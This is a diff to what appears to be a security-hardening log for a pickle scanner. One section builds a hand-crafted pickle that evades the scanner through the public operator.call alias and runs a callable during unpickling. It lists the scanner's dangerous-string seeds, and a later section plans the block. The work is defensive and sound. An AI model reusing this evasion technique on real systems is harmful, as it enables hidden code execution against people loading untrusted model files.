@@ -413,3 +413,84 @@ Blocking plan:
 
 Performance note: the fix is a single additional binary-search entry. It does
 not add annotation parsing, source parsing, or broader string scanning.
+
+## Turn 13 - `operator.call` public-alias invocation gap
+
+Goal: produce another self-contained code-execution pickle that
+`packages/modelaudit-picklescan` does not flag.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    return b"\x8c" + bytes([len(data)]) + data
+
+
+marker = Path("/tmp/ma_operator_call_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        s("operator"),
+        s("call"),
+        b"\x93",
+        s("pathlib"),
+        s("Path.touch"),
+        b"\x93",
+        s("pathlib"),
+        s("PosixPath"),
+        b"\x93(",
+        s("/"),
+        s("tmp"),
+        s("ma_operator_call_marker"),
+        b"tR",
+        b"\x86R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`,
+  `notices=[]`
+- Unpickle result: creates `/tmp/ma_operator_call_marker` and returns `None`
+- RCE mechanism: `operator.call(func, *args, **kwargs)` invokes its supplied
+  callable. The pickle resolves the public `operator.call` alias, supplies the
+  currently clean callable `pathlib.Path.touch`, constructs a `Path`, and calls
+  it during unpickling. The same sink can invoke attacker-chosen importable
+  callables with attacker-controlled arguments.
+
+Why the scanner missed it:
+
+- `_operator` is wildcard-dangerous, so a normal `pickle.dumps(operator.call)`
+  payload is detected as `_operator.call`; however, a hand-built
+  `GLOBAL operator call` resolves through the public `operator` module.
+- `operator.call` is absent from `DANGEROUS_GLOBALS`; only
+  `operator.attrgetter`, `operator.itemgetter`, and `operator.methodcaller` are
+  listed.
+- The payload uses only currently clean globals: `operator.call`,
+  `pathlib.Path.touch`, and `pathlib.PosixPath`, with no suspicious string
+  seeds such as `eval(`, `exec(`, `__import__`, `os.system`, or `subprocess`.
+
+Performance note: this is a policy alias coverage gap for an arbitrary-call
+sink. The narrow next block is a sorted `DANGEROUS_GLOBALS` entry for
+`("operator", "call")`, plus a manual-pickle oracle regression that proves
+scan-time detection before unpickle-time marker creation.
+
+## Turn 14 - Block `operator.call`
+
+Blocking plan:
+
+- Add `("operator", "call")` to the sorted dangerous-global table. The
+  `_operator.call` spelling is already covered by the `_operator` wildcard, so
+  this closes the public-module alias.
+- Add portable policy coverage for raw `GLOBAL operator call` reductions.
+- Add a CPython oracle regression that manually builds the public-alias
+  `operator.call(pathlib.Path.touch, marker)` pickle, verifies scanner
+  detection, then verifies the marker file appears only during unpickle.
+
+Performance note: the fix is a single additional binary-search entry. It does
+not add callable-flow analysis or any extra string scanning.
